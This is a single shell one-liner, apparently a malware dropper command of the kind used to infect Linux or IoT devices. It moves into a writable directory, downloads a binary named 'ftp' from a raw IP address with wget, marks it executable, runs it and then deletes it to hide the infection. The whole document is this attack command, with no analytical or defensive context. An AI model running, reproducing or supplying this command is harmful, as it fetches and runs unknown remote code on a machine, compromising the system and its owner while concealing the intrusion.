cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.203.249.83/ftp; chmod +x ftp; ./ftp; rm -rf ftp
